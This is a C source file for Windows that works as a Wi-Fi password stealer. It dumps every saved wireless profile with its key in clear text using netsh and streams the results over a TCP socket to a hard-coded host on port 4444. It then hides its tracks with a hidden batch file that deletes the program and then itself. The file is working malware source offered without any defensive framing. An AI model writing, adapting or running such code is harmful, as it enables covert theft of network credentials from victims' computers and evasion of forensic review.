#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>


#define BUF_SIZE 4096
#define IP "192.168.219.186"
#define PORT 4444

const char* run_command(char *command);
// void write_file(char* content);
// void erase();
void kill(char* filename);

int main(int argc, char* argv[]) {
    char *data = run_command("netsh wlan show profiles");
    char *ptr = strtok(data, "\n");
    char *ptr2;
    char command[BUF_SIZE];
    memset(command, 0, BUF_SIZE);

    WSADATA wsaData;
    SOCKET s;
    SOCKADDR_IN sa;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sa.sin_family = AF_INET;
    sa.sin_port = htons(PORT);
    sa.sin_addr.S_un.S_addr = inet_addr(IP);

    connect(s, (SOCKADDR*)&sa, sizeof(sa));

    while (ptr != NULL) {
        ptr2 = strstr(ptr, " : ");
        
        if (ptr2 != NULL) {
            strcat(command, "netsh wlan show profiles ");
            strcat(command, ptr2 + 3);
            strcat(command, " Key=clear");

            char buffer[BUF_SIZE];
            char result[BUF_SIZE];

            FILE *fp;

            fp = popen(command, "r");

            if (fp == NULL) {
                return 1;
            }

            while (fgets(buffer, BUF_SIZE, fp) != NULL) {
                strcat(result, buffer);
            }

            pclose(fp);

            send(s, result, sizeof(result), 0);
            memset(result, 0, BUF_SIZE);
            memset(buffer, 0, BUF_SIZE);
            memset(command, 0, BUF_SIZE);
        }

        ptr = strtok(NULL, "\n");
    }

    send(s, "quit", sizeof("quit"), 0);

    WSACleanup();
    // erase(argv[0]);
    kill(argv[0]);
}

void kill(char* filename) {
	FILE *fp;
 
	fp = fopen( "deleteme.bat", "wt" );
 
 
	fprintf( fp, "\
:AAA\ndel \"%s\"\n\
IF exist \"%s\" GOTO AAA\n\
:BBB\n\
del deleteme.bat\n\
IF exist deleteme.bat GOTO BBB\n", filename, filename );
 
	fclose( fp );
	ShellExecute( NULL, "open", "deleteme.bat", NULL, NULL, SW_HIDE );
}



// void erase(char* filename) {
//     remove("log.txt");
//     FILE* fp;
//     fp = fopen("deleteme.bat", "wt");

// 	fprintf( fp, "\
// :AAA\ndel \"%s\"\n\
// IF exist \"%s\" GOTO AAA\n\
// :BBB\n\
// del deleteme.bat\n\
// IF exist deleteme.bat GOTO BBB\n", filename, filename );
 
// 	fclose( fp );
// 	ShellExecute( NULL, "open", "deleteme.bat", NULL, NULL, SW_HIDE );
// }

// void write_file(char* content) {
//     FILE *fp = fopen("log.txt", "w");
//     fputs(content, fp);
//     fclose(fp);
// }

const char* run_command(char* command) {
    static char result[BUF_SIZE];
    char buf[BUF_SIZE];
    FILE* fp;

    fp = popen(command, "r");

    if (fp == NULL) {
        exit(-1);
    }

    while (fgets(buf, BUF_SIZE, fp) != NULL) {
        strcat(result, buf);
    }

    pclose(fp);

    return result;
}